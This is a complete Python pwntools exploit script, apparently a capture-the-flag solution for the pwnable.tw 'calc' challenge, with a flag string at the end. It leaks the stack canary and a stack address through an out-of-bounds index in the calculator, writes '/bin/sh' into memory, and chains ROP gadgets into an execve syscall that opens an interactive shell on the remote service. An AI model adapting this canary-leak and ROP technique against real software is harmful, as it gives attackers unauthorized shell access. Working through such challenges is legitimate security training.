from pwn import *
 
debug= 0
 
pop_eax= 0x0805c34b # pop eax ; ret
pop_ecx_ebx= 0x080701d1 # pop ecx ; pop ebx ; ret
pop_edx= 0x080701aa # pop edx ; ret
int80= 0x08049a21 # int 0x80
 
def send_rop(addr, val):
    if val >0x7fffffff:
        s.sendline('+'+str(addr+1))
        ori_val= int(s.recvline().strip())
        if debug:
            log.info('ori : '+hex(ori_val))
        diff= 0x100000000 + ori_val- val
        s.sendline('+'+str(addr)+'+00%'+str(diff))
    else:
        s.sendline('+'+str(addr)+'+'+str(val))
    s.recvline()
 
def exploit():
    s.recvline()
    # canary leak
    s.sendline('+357')
    canary= int(s.recvline().strip())
    if canary <0:
        canary+= 0x100000000
    if debug:
        log.info('canary : '+hex(canary))
 
    # stack leak
    s.sendline('+360')
    stack= int(s.recvline().strip())- 0x20 # ebp in calc()
    if stack <0:
        stack+= 0x100000000
    if debug:
        log.info('stack : '+hex(stack))
 
    bss_offset= (0x100000000 - (stack- 0x5a0)+ 0x080eb050)
    send_rop(bss_offset/ 4 + 1, u32('/sh\x00'))
    send_rop(bss_offset/ 4, u32('/bin'))
    send_rop(367, int80)
    send_rop(366,0x080eb040)
    send_rop(365, pop_edx)
    send_rop(364,0x080eb044)
    send_rop(363,0x080eb040)
    send_rop(362, pop_ecx_ebx)
    send_rop(361,0x0b)
    send_rop(360, pop_eax)
    s.sendline(' ')
 
if __name__== '__main__':
    if debug:
        s= process('./calc')
        pause()
    else:
        s= remote('chall.pwnable.tw',10100)
 
    exploit()
    s.interactive()
    s.close()
#FLAG{C:\Windows\System32\calc.exe}